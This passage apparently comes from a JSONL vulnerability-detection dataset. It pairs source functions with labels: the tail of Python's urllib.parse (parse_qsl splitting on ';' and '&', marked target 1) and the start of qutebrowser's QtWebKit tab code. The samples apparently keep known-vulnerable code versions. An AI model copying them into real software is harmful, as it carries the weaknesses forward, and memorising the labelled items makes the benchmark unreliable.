errors='replace', max_num_fields=None):\n    \"\"\"Parse a query given as a string argument.\n\n        Arguments:\n\n        qs: percent-encoded query string to be parsed\n\n        keep_blank_values: flag indicating whether blank values in\n            percent-encoded queries should be treated as blank strings.\n            A true value indicates that blanks should be retained as blank\n            strings.  The default false value indicates that blank values\n            are to be ignored and treated as if they were  not included.\n\n        strict_parsing: flag indicating what to do with parsing errors. If\n            false (the default), errors are silently ignored. If true,\n            errors raise a ValueError exception.\n\n        encoding and errors: specify how to decode percent-encoded sequences\n            into Unicode characters, as accepted by the bytes.decode() method.\n\n        max_num_fields: int. If set, then throws a ValueError\n            if there are more than n fields read by parse_qsl().\n\n        Returns a list, as G-d intended.\n    \"\"\"\n    qs, _coerce_result = _coerce_args(qs)\n\n    # If max_num_fields is defined then check that the number of fields\n    # is less than max_num_fields. This prevents a memory exhaustion DOS\n    # attack via post bodies with many fields.\n    if max_num_fields is not None:\n        num_fields = 1 + qs.count('&') + qs.count(';')\n        if max_num_fields < num_fields:\n            raise ValueError('Max number of fields exceeded')\n\n    pairs = [s2 for s1 in qs.split('&') for s2 in s1.split(';')]\n    r = []\n    for name_value in pairs:\n        if not name_value and not strict_parsing:\n            continue\n        nv = name_value.split('=', 1)\n        if len(nv) != 2:\n            if strict_parsing:\n                raise ValueError(\"bad query field: %r\" % (name_value,))\n            # Handle case of a control-name with no equal sign\n            if keep_blank_values:\n                nv.append('')\n            else:\n                continue\n        if len(nv[1]) or keep_blank_values:\n            name = nv[0].replace('+', ' ')\n            name = unquote(name, encoding=encoding, errors=errors)\n            name = _coerce_result(name)\n            value = nv[1].replace('+', ' ')\n            value = unquote(value, encoding=encoding, errors=errors)\n            value = _coerce_result(value)\n            r.append((name, value))\n    return r\n\ndef unquote_plus(string, encoding='utf-8', errors='replace'):\n    \"\"\"Like unquote(), but also replace plus signs by spaces, as required for\n    unquoting HTML form values.\n\n    unquote_plus('%7e/abc+def') -> '~/abc def'\n    \"\"\"\n    string = string.replace('+', ' ')\n    return unquote(string, encoding, errors)\n\n_ALWAYS_SAFE = frozenset(b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n                         b'abcdefghijklmnopqrstuvwxyz'\n                         b'0123456789'\n                         b'_.-~')\n_ALWAYS_SAFE_BYTES = bytes(_ALWAYS_SAFE)\n_safe_quoters = {}\n\nclass Quoter(collections.defaultdict):\n    \"\"\"A mapping from bytes (in range(0,256)) to strings.\n\n    String values are percent-encoded byte values, unless the key < 128, and\n    in the \"safe\" set (either the specified safe set, or default set).\n    \"\"\"\n    # Keeps a cache internally, using defaultdict, for efficiency (lookups\n    # of cached keys don't call Python code at all).\n    def __init__(self, safe):\n        \"\"\"safe: bytes object.\"\"\"\n        self.safe = _ALWAYS_SAFE.union(safe)\n\n    def __repr__(self):\n        # Without this, will just display as a defaultdict\n        return \"<%s %r>\" % (self.__class__.__name__, dict(self))\n\n    def __missing__(self, b):\n        # Handle a cache miss. Store quoted string in cache and return.\n        res = chr(b) if b in self.safe else '%{:02X}'.format(b)\n        self[b] = res\n        return res\n\ndef quote(string, safe='/', encoding=None, errors=None):\n    \"\"\"quote('abc def') -> 'abc%20def'\n\n    Each part of a URL, e.g. the path info, the query, etc., has a\n    different set of reserved characters that must be quoted. The\n    quote function offers a cautious (not minimal) way to quote a\n    string for most of these parts.\n\n    RFC 3986 Uniform Resource Identifier (URI): Generic Syntax lists\n    the following (un)reserved characters.\n\n    unreserved    = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\"\n    reserved      = gen-delims / sub-delims\n    gen-delims    = \":\" / \"/\" / \"?\" / \"#\" / \"[\" / \"]\" / \"@\"\n    sub-delims    = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\"\n                  / \"*\" / \"+\" / \",\" / \";\" / \"=\"\n\n    Each of the reserved characters is reserved in some component of a URL,\n    but not necessarily in all of them.\n\n    The quote function %-escapes all characters that are neither in the\n    unreserved chars (\"always safe\") nor the additional chars set via the\n    safe arg.\n\n    The default for the safe arg is '/'. The character is reserved, but in\n    typical usage the quote function is being called on a path where the\n    existing slash characters are to be preserved.\n\n    Python 3.7 updates from using RFC 2396 to RFC 3986 to quote URL strings.\n    Now, \"~\" is included in the set of unreserved characters.\n\n    string and safe may be either str or bytes objects. encoding and errors\n    must not be specified if string is a bytes object.\n\n    The optional encoding and errors parameters specify how to deal with\n    non-ASCII characters, as accepted by the str.encode method.\n    By default, encoding='utf-8' (characters are encoded with UTF-8), and\n    errors='strict' (unsupported characters raise a UnicodeEncodeError).\n    \"\"\"\n    if isinstance(string, str):\n        if not string:\n            return string\n        if encoding is None:\n            encoding = 'utf-8'\n        if errors is None:\n            errors = 'strict'\n        string = string.encode(encoding, errors)\n    else:\n        if encoding is not None:\n            raise TypeError(\"quote() doesn't support 'encoding' for bytes\")\n        if errors is not None:\n            raise TypeError(\"quote() doesn't support 'errors' for bytes\")\n    return quote_from_bytes(string, safe)\n\ndef quote_plus(string, safe='', encoding=None, errors=None):\n    \"\"\"Like quote(), but also replace ' ' with '+', as required for quoting\n    HTML form values. Plus signs in the original string are escaped unless\n    they are included in safe. It also does not have safe default to '/'.\n    \"\"\"\n    # Check if ' ' in string, where string may either be a str or bytes.  If\n    # there are no spaces, the regular quote will produce the right answer.\n    if ((isinstance(string, str) and ' ' not in string) or\n        (isinstance(string, bytes) and b' ' not in string)):\n        return quote(string, safe, encoding, errors)\n    if isinstance(safe, str):\n        space = ' '\n    else:\n        space = b' '\n    string = quote(string, safe + space, encoding, errors)\n    return string.replace(' ', '+')\n\ndef quote_from_bytes(bs, safe='/'):\n    \"\"\"Like quote(), but accepts a bytes object rather than a str, and does\n    not perform string-to-bytes encoding.  It always returns an ASCII string.\n    quote_from_bytes(b'abc def\\x3f') -> 'abc%20def%3f'\n    \"\"\"\n    if not isinstance(bs, (bytes, bytearray)):\n        raise TypeError(\"quote_from_bytes() expected bytes\")\n    if not bs:\n        return ''\n    if isinstance(safe, str):\n        # Normalize 'safe' by converting to bytes and removing non-ASCII chars\n        safe = safe.encode('ascii', 'ignore')\n    else:\n        safe = bytes([c for c in safe if c < 128])\n    if not bs.rstrip(_ALWAYS_SAFE_BYTES + safe):\n        return bs.decode()\n    try:\n        quoter = _safe_quoters[safe]\n    except KeyError:\n        _safe_quoters[safe] = quoter = Quoter(safe).__getitem__\n    return ''.join([quoter(char) for char in bs])\n\ndef urlencode(query, doseq=False, safe='', encoding=None, errors=None,\n              quote_via=quote_plus):\n    \"\"\"Encode a dict or sequence of two-element tuples into a URL query string.\n\n    If any values in the query arg are sequences and doseq is true, each\n    sequence element is converted to a separate parameter.\n\n    If the query arg is a sequence of two-element tuples, the order of the\n    parameters in the output will match the order of parameters in the\n    input.\n\n    The components of a query arg may each be either a string or a bytes type.\n\n    The safe, encoding, and errors parameters are passed down to the function\n    specified by quote_via (encoding and errors only if a component is a str).\n    \"\"\"\n\n    if hasattr(query, \"items\"):\n        query = query.items()\n    else:\n        # It's a bother at times that strings and string-like objects are\n        # sequences.\n        try:\n            # non-sequence items should not work with len()\n            # non-empty strings will fail this\n            if len(query) and not isinstance(query[0], tuple):\n                raise TypeError\n            # Zero-length sequences of all types will get here and succeed,\n            # but that's a minor nit.  Since the original implementation\n            # allowed empty dicts that type of behavior probably should be\n            # preserved for consistency\n        except TypeError:\n            ty, va, tb = sys.exc_info()\n            raise TypeError(\"not a valid non-string sequence \"\n                            \"or mapping object\").with_traceback(tb)\n\n    l = []\n    if not doseq:\n        for k, v in query:\n            if isinstance(k, bytes):\n                k = quote_via(k, safe)\n            else:\n                k = quote_via(str(k), safe, encoding, errors)\n\n            if isinstance(v, bytes):\n                v = quote_via(v, safe)\n            else:\n                v = quote_via(str(v), safe, encoding, errors)\n            l.append(k + '=' + v)\n    else:\n        for k, v in query:\n            if isinstance(k, bytes):\n                k = quote_via(k, safe)\n            else:\n                k = quote_via(str(k), safe, encoding, errors)\n\n            if isinstance(v, bytes):\n                v = quote_via(v, safe)\n                l.append(k + '=' + v)\n            elif isinstance(v, str):\n                v = quote_via(v, safe, encoding, errors)\n                l.append(k + '=' + v)\n            else:\n                try:\n                    # Is this a sufficient test for sequence-ness?\n                    x = len(v)\n                except TypeError:\n                    # not a sequence\n                    v = quote_via(str(v), safe, encoding, errors)\n                    l.append(k + '=' + v)\n                else:\n                    # loop over the sequence\n                    for elt in v:\n                        if isinstance(elt, bytes):\n                            elt = quote_via(elt, safe)\n                        else:\n                            elt = quote_via(str(elt), safe, encoding, errors)\n                        l.append(k + '=' + elt)\n    return '&'.join(l)\n\n\ndef to_bytes(url):\n    warnings.warn(\"urllib.parse.to_bytes() is deprecated as of 3.8\",\n                  DeprecationWarning, stacklevel=2)\n    return _to_bytes(url)\n\n\ndef _to_bytes(url):\n    \"\"\"to_bytes(u\"URL\") --> 'URL'.\"\"\"\n    # Most URL schemes require ASCII. If that changes, the conversion\n    # can be relaxed.\n    # XXX get rid of to_bytes()\n    if isinstance(url, str):\n        try:\n            url = url.encode(\"ASCII\").decode()\n        except UnicodeError:\n            raise UnicodeError(\"URL \" + repr(url) +\n                               \" contains non-ASCII characters\")\n    return url\n\n\ndef unwrap(url):\n    \"\"\"Transform a string like '<URL:scheme://host/path>' into 'scheme://host/path'.\n\n    The string is returned unchanged if it's not a wrapped URL.\n    \"\"\"\n    url = str(url).strip()\n    if url[:1] == '<' and url[-1:] == '>':\n        url = url[1:-1].strip()\n    if url[:4] == 'URL:':\n        url = url[4:].strip()\n    return url\n\n\ndef splittype(url):\n    warnings.warn(\"urllib.parse.splittype() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splittype(url)\n\n\n_typeprog = None\ndef _splittype(url):\n    \"\"\"splittype('type:opaquestring') --> 'type', 'opaquestring'.\"\"\"\n    global _typeprog\n    if _typeprog is None:\n        _typeprog = re.compile('([^/:]+):(.*)', re.DOTALL)\n\n    match = _typeprog.match(url)\n    if match:\n        scheme, data = match.groups()\n        return scheme.lower(), data\n    return None, url\n\n\ndef splithost(url):\n    warnings.warn(\"urllib.parse.splithost() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splithost(url)\n\n\n_hostprog = None\ndef _splithost(url):\n    \"\"\"splithost('//host[:port]/path') --> 'host[:port]', '/path'.\"\"\"\n    global _hostprog\n    if _hostprog is None:\n        _hostprog = re.compile('//([^/#?]*)(.*)', re.DOTALL)\n\n    match = _hostprog.match(url)\n    if match:\n        host_port, path = match.groups()\n        if path and path[0] != '/':\n            path = '/' + path\n        return host_port, path\n    return None, url\n\n\ndef splituser(host):\n    warnings.warn(\"urllib.parse.splituser() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splituser(host)\n\n\ndef _splituser(host):\n    \"\"\"splituser('user[:passwd]@host[:port]') --> 'user[:passwd]', 'host[:port]'.\"\"\"\n    user, delim, host = host.rpartition('@')\n    return (user if delim else None), host\n\n\ndef splitpasswd(user):\n    warnings.warn(\"urllib.parse.splitpasswd() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitpasswd(user)\n\n\ndef _splitpasswd(user):\n    \"\"\"splitpasswd('user:passwd') -> 'user', 'passwd'.\"\"\"\n    user, delim, passwd = user.partition(':')\n    return user, (passwd if delim else None)\n\n\ndef splitport(host):\n    warnings.warn(\"urllib.parse.splitport() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitport(host)\n\n\n# splittag('/path#tag') --> '/path', 'tag'\n_portprog = None\ndef _splitport(host):\n    \"\"\"splitport('host:port') --> 'host', 'port'.\"\"\"\n    global _portprog\n    if _portprog is None:\n        _portprog = re.compile('(.*):([0-9]*)$', re.DOTALL)\n\n    match = _portprog.match(host)\n    if match:\n        host, port = match.groups()\n        if port:\n            return host, port\n    return host, None\n\n\ndef splitnport(host, defport=-1):\n    warnings.warn(\"urllib.parse.splitnport() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitnport(host, defport)\n\n\ndef _splitnport(host, defport=-1):\n    \"\"\"Split host and port, returning numeric port.\n    Return given default port if no ':' found; defaults to -1.\n    Return numerical port if a valid number are found after ':'.\n    Return None if ':' but not a valid number.\"\"\"\n    host, delim, port = host.rpartition(':')\n    if not delim:\n        host = port\n    elif port:\n        try:\n            nport = int(port)\n        except ValueError:\n            nport = None\n        return host, nport\n    return host, defport\n\n\ndef splitquery(url):\n    warnings.warn(\"urllib.parse.splitquery() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitquery(url)\n\n\ndef _splitquery(url):\n    \"\"\"splitquery('/path?query') --> '/path', 'query'.\"\"\"\n    path, delim, query = url.rpartition('?')\n    if delim:\n        return path, query\n    return url, None\n\n\ndef splittag(url):\n    warnings.warn(\"urllib.parse.splittag() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splittag(url)\n\n\ndef _splittag(url):\n    \"\"\"splittag('/path#tag') --> '/path', 'tag'.\"\"\"\n    path, delim, tag = url.rpartition('#')\n    if delim:\n        return path, tag\n    return url, None\n\n\ndef splitattr(url):\n    warnings.warn(\"urllib.parse.splitattr() is deprecated as of 3.8, \"\n                  \"use urllib.parse.urlparse() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitattr(url)\n\n\ndef _splitattr(url):\n    \"\"\"splitattr('/path;attr1=value1;attr2=value2;...') ->\n        '/path', ['attr1=value1', 'attr2=value2', ...].\"\"\"\n    words = url.split(';')\n    return words[0], words[1:]\n\n\ndef splitvalue(attr):\n    warnings.warn(\"urllib.parse.splitvalue() is deprecated as of 3.8, \"\n                  \"use urllib.parse.parse_qsl() instead\",\n                  DeprecationWarning, stacklevel=2)\n    return _splitvalue(attr)\n\n\ndef _splitvalue(attr):\n    \"\"\"splitvalue('attr=value') --> 'attr', 'value'.\"\"\"\n    attr, delim, value = attr.partition('=')\n    return attr, (value if delim else None)\n", "target": 1}
{"idx": 1049, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2019 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Wrapper over our (QtWebKit) WebView.\"\"\"\n\nimport re\nimport functools\nimport xml.etree.ElementTree\n\nfrom PyQt5.QtCore import pyqtSlot, Qt, QUrl, QPoint, QTimer, QSizeF, QSize\nfrom PyQt5.QtGui import QIcon\nfrom PyQt5.QtWebKitWidgets import QWebPage, QWebFrame\nfrom PyQt5.QtWebKit import QWebSettings\nfrom PyQt5.QtPrintSupport import QPrinter\n\nfrom qutebrowser.browser import browsertab, shared\nfrom qutebrowser.browser.webkit import (webview, tabhistory, webkitelem,\n                                        webkitsettings)\nfrom qutebrowser.utils import qtutils, usertypes, utils, log, debug\nfrom qutebrowser.qt import sip\n\n\nclass WebKitAction(browsertab.AbstractAction):\n\n    \"\"\"QtWebKit implementations related to web actions.\"\"\"\n\n    action_class = QWebPage\n    action_base = QWebPage.WebAction\n\n    def exit_fullscreen(self):\n        raise browsertab.UnsupportedOperationError\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        raise browsertab.UnsupportedOperationError\n\n    def show_source(self, pygments=False):\n        self._show_source_pygments()\n\n\nclass WebKitPrinting(browsertab.AbstractPrinting):\n\n    \"\"\"QtWebKit implementations related to printing.\"\"\"\n\n    def check_pdf_support(self):\n        pass\n\n    def check_printer_support(self):\n        pass\n\n    def check_preview_support(self):\n        pass\n\n    def to_pdf(self, filename):\n        printer = QPrinter()\n        printer.setOutputFileName(filename)\n        self.to_printer(printer)\n\n    def to_printer(self, printer, callback=None):\n        self._widget.print(printer)\n        # Can't find out whether there was an error...\n        if callback is not None:\n            callback(True)\n\n\nclass WebKitSearch(browsertab.AbstractSearch):\n\n    \"\"\"QtWebKit implementations related to searching on the page.\"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(tab, parent)\n        self._flags = QWebPage.FindFlags(0)\n\n    def _call_cb(self, callback, found, text, flags, caller):\n        \"\"\"Call the given callback if it's non-None.\n\n        Delays the call via a QTimer so the website is re-rendered in between.\n\n        Args:\n            callback: What to call\n            found: If the text was found\n            text: The text searched for\n            flags: The flags searched with\n            caller: Name of the caller.\n        \"\"\"\n        found_text = 'found' if found else \"didn't find\"\n        # Removing FindWrapsAroundDocument to get the same logging as with\n        # QtWebEngine\n        debug_flags = debug.qflags_key(\n            QWebPage, flags & ~QWebPage.FindWrapsAroundDocument,\n            klass=QWebPage.FindFlag)\n        if debug_flags != '0x0000':\n            flag_text = 'with flags {}'.format(debug_flags)\n        else:\n            flag_text = ''\n        log.webview.debug(' '.join([caller, found_text, text, flag_text])\n                          .strip())\n        if callback is not None:\n            QTimer.singleShot(0, functools.partial(callback, found))\n\n        self.finished.emit(found)\n\n    def clear(self):\n        if self.search_displayed:\n            self.cleared.emit()\n        self.search_displayed = False\n        # We first clear the marked text, then the highlights\n        self._widget.findText('')\n        self._widget.findText('', QWebPage.HighlightAllOccurrences)\n\n    def search(self, text, *, ignore_case=usertypes.IgnoreCase.never,\n               reverse=False, result_cb=None):\n        # Don't go to next entry on duplicate search\n        if self.text == text and self.search_displayed:\n            log.webview.debug(\"Ignoring duplicate search request\"\n                              \" for {}\".format(text))\n            return\n\n        # Clear old search results, this is done automatically on QtWebEngine.\n        self.clear()\n\n        self.text = text\n        self.search_displayed = True\n        self._flags = QWebPage.FindWrapsAroundDocument\n        if self._is_case_sensitive(ignore_case):\n            self._flags |= QWebPage.FindCaseSensitively\n        if reverse:\n            self._flags |= QWebPage.FindBackward\n        # We actually search *twice* - once to highlight everything, then again\n        # to get a mark so we can navigate.\n        found = self._widget.findText(text, self._flags)\n        self._widget.findText(text,\n                              self._flags | QWebPage.HighlightAllOccurrences)\n        self._call_cb(result_cb, found, text, self._flags, 'search')\n\n    def next_result(self, *, result_cb=None):\n        self.search_displayed = True\n        found = self._widget.findText(self.text, self._flags)\n        self._call_cb(result_cb, found, self.text, self._flags, 'next_result')\n\n    def prev_result(self, *, result_cb=None):\n        self.search_displayed = True\n        # The int() here makes sure we get a copy of the flags.\n        flags = QWebPage.FindFlags(int(self._flags))\n        if flags & QWebPage.FindBackward:\n            flags &= ~QWebPage.FindBackward\n        else:\n            flags |= QWebPage.FindBackward\n        found = self._widget.findText(self.text, flags)\n        self._call_cb(result_cb, found, self.text, flags, 'prev_result')\n\n\nclass WebKitCaret(browsertab.AbstractCaret):\n\n    \"\"\"QtWebKit implementations related to moving the cursor/selection.\"\"\"\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_entered(self, mode):\n        if mode != usertypes.KeyMode.caret:\n            return\n\n        self.selection_enabled = self._widget.hasSelection()\n        self.selection_toggled.emit(self.selection_enabled)\n        settings = self._widget.settings()\n        settings.setAttribute(QWebSettings.CaretBrowsingEnabled, True)\n\n        if self._widget.isVisible():\n            # Sometimes the caret isn't immediately visible, but unfocusing\n            # and refocusing it fixes that.\n            self._widget.clearFocus()\n            self._widget.setFocus(Qt.OtherFocusReason)\n\n            # Move the caret to the first element in the viewport if there\n            # isn't any text which is already selected.\n            #\n            # Note: We can't use hasSelection() here, as that's always\n            # true in caret mode.\n            if not self.selection_enabled:\n                self._widget.page().currentFrame().evaluateJavaScript(\n                    utils.read_file('javascript/position_caret.js'))\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_left(self, _mode):\n        settings = self._widget.settings()\n        if settings.testAttribute(QWebSettings.CaretBrowsingEnabled):\n            if self.selection_enabled and self._widget.hasSelection():\n                # Remove selection if it exists\n                self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n            settings.setAttribute(QWebSettings.CaretBrowsingEnabled, False)\n            self.selection_enabled = False\n\n    def move_to_next_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextLine\n        else:\n            act = QWebPage.SelectNextLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousLine\n        else:\n            act = QWebPage.SelectPreviousLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_next_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextChar\n        else:\n            act = QWebPage.SelectNextChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousChar\n        else:\n            act = QWebPage.SelectPreviousChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_end_of_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.MoveToPreviousChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.SelectPreviousChar)\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_next_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.MoveToNextChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.SelectNextChar)\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_prev_word(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousWord\n        else:\n            act = QWebPage.SelectPreviousWord\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_start_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfLine\n        else:\n            act = QWebPage.SelectStartOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfLine\n        else:\n            act = QWebPage.SelectEndOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_start_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine, QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine, QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfDocument\n        else:\n            act = QWebPage.SelectStartOfDocument\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfDocument\n        else:\n            act = QWebPage.SelectEndOfDocument\n        self._widget.triggerPageAction(act)\n\n    def toggle_selection(self):\n        self.selection_enabled = not self.selection_enabled\n        self.selection_toggled.emit(self.selection_enabled)\n\n    def drop_selection(self):\n        self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n\n    def selection(self, callback):\n        callback(self._widget.selectedText())\n\n    def _follow_selected(self, *, tab=False):\n        if QWebSettings.globalSettings().testAttribute(\n                QWebSettings.JavascriptEnabled):\n            if tab:\n                self._tab.data.override_target = usertypes.ClickTarget.tab\n            self._tab.run_js_async(\"\"\"\n                const aElm = document.activeElement;\n                if (window.getSelection().anchorNode) {\n                    window.getSelection().anchorNode.parentNode.click();\n                } else if (aElm && aElm !== document.body) {\n                    aElm.click();\n                }\n            \"\"\")\n        else:\n            selection = self._widget.selectedHtml()\n            if not selection:\n                # Getting here may mean we crashed, but we can't do anything\n                # about that until this commit is released:\n                # https://github.com/annulen/webkit/commit/0e75f3272d149bc64899c161f150eb341a2417af\n                # TODO find a way to check if something is focused\n                self._follow_enter(tab)\n                return\n            try:\n                selected_element = xml.etree.ElementTree.fromstring(\n                    '<html>{}</html>'.format(selection)).find('a')\n            except xml.etree.ElementTree.ParseError:\n                raise browsertab.WebTabError('Could not parse selected '\n                                             'element!')\n\n            if selected_element is not None:\n                try:\n                    url = selected_element.attrib['href']\n                except KeyError:\n                    raise browsertab.WebTabError('Anchor element without '\n                                                 'href!')\n                url = self._tab.url().resolved(QUrl(url))\n                if tab:\n                    self._tab.new_tab_requested.emit(url)\n                else:\n                    self._tab.load_url(url)\n\n    def follow_selected(self, *, tab=False):\n        try:\n            self._follow_selected(tab=tab)\n        finally:\n            self.follow_selected_done.emit()\n\n\nclass WebKitZoom(browsertab.AbstractZoom):\n\n    \"\"\"QtWebKit implementations related to zooming.\"\"\"\n\n    def _set_factor_internal(self, factor):\n        self._widget.setZoomFactor(factor)\n\n\nclass WebKitScroller(browsertab.AbstractScroller):\n\n    \"\"\"QtWebKit implementations related to scrolling.\"\"\"\n\n    # FIXME:qtwebengine When to use the main frame, when the current one?\n\n    def pos_px(self):\n        return self._widget.page().mainFrame().scrollPosition()\n\n    def pos_perc(self):\n        return self._widget.scroll_pos\n\n    def to_point(self, point):\n        self._widget.page().mainFrame().setScrollPosition(point)\n\n    def to_anchor(self, name):\n        self._widget.page().mainFrame().scrollToAnchor(name)\n\n    def delta(self, x=0, y=0):\n        qtutils.check_overflow(x, 'int')\n        qtutils.check_overflow(y, 'int')\n        self._widget.page().mainFrame().scroll(x, y)\n\n    def delta_page(self, x=0.0, y=0.0):\n        if y.is_integer():\n            y = int(y)\n            if y == 0:\n                pass\n            elif y < 0:\n                self.page_up(count=-y)\n            elif y > 0:\n                self.page_down(count=y)\n            y = 0\n        if x == 0 and y == 0:\n            return\n        size = self._widget.page().mainFrame().geometry()\n        self.delta(x * size.width(), y * size.height())\n\n    def to_perc(self, x=None, y=None):\n        if x is None and y == 0:\n            self.top()\n        elif x is None and y == 100:\n            self.bottom()\n        else:\n            for val, orientation in [(x, Qt.Horizontal), (y, Qt.Vertical)]:\n                if val is not None:\n                    frame = self._widget.page().mainFrame()\n                    maximum = frame.scrollBarMaximum(orientation)\n                    if maximum == 0:\n                        continue\n                    pos = int(maximum * val / 100)\n                    pos = qtutils.check_overflow(pos, 'int', fatal=False)\n                    frame.setScrollBarValue(orientation, pos)\n\n    def _key_press(self, key, count=1, getter_name=None, direction=None):\n        frame = self._widget.page().mainFrame()\n        getter = None if getter_name is None else getattr(frame, getter_name)\n\n        # FIXME:qtwebengine needed?\n        # self._widget.setFocus()\n\n        for _ in range(min(count, 5000)):\n            # Abort scrolling if the minimum/maximum was reached.\n            if (getter is not None and\n                    frame.scrollBarValue(direction) == getter(direction)):\n                return\n            self._tab.fake_key_press(key)\n\n    def up(self, count=1):\n        self._key_press(Qt.Key_Up, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def down(self, count=1):\n        self._key_press(Qt.Key_Down, count, 'scrollBarMaximum', Qt.Vertical)\n\n    def left(self, count=1):\n        self._key_press(Qt.Key_Left, count, 'scrollBarMinimum', Qt.Horizontal)\n\n    def right(self, count=1):\n        self._key_press(Qt.Key_Right, count, 'scrollBarMaximum', Qt.Horizontal)\n\n    def top(self):\n        self._key_press(Qt.Key_Home)\n\n    def bottom(self):\n        self._key_press(Qt.Key_End)\n\n    def page_up(self, count=1):\n        self._key_press(Qt.Key_PageUp, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def page_down(self, count=1):\n        self._key_press(Qt.Key_PageDown, count, 'scrollBarMaximum',\n                        Qt.Vertical)\n\n    def at_top(self):\n        return self.pos_px().y() == 0\n\n    def at_bottom(self):\n        frame = self._widget.page().currentFrame()\n        return self.pos_px().y() >= frame.scrollBarMaximum(Qt.Vertical)\n\n\nclass WebKitHistoryPrivate(browsertab.AbstractHistoryPrivate):\n\n    \"\"\"History-related methods which are not part of the extension API.\"\"\"\n\n    def serialize(self):\n        return qtutils.serialize(self._history)\n\n    def deserialize(self, data):\n        qtutils.deserialize(data, self._history)\n\n    def load_items(self, items):\n        if items:\n            self._tab.before_load_started.emit(items[-1].url)\n\n        